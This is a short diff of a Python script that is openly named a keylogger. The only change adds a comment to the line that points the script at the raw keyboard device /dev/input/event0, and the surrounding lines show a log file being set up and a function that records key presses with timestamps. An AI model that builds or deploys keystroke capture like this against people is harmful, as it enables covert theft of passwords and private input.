@@ -13,7 +13,7 @@ if not os.path.exists(KEYLOGGER_FILE):
     with open(KEYLOGGER_FILE, 'w') as f:
         f.write("Keylogger started at " + time.strftime('%d/%m/%Y %H:%M:%S') + "\n")
 
-KEYBOARD_DEVICE = "/dev/input/event0"
+KEYBOARD_DEVICE = "/dev/input/event0"    #ADD KEYBOARD EVENT
 
 def log_key(key):   #Logs key presses with timestamp.
     timestamp = time.strftime('%d/%m/%Y %H:%M:%S')
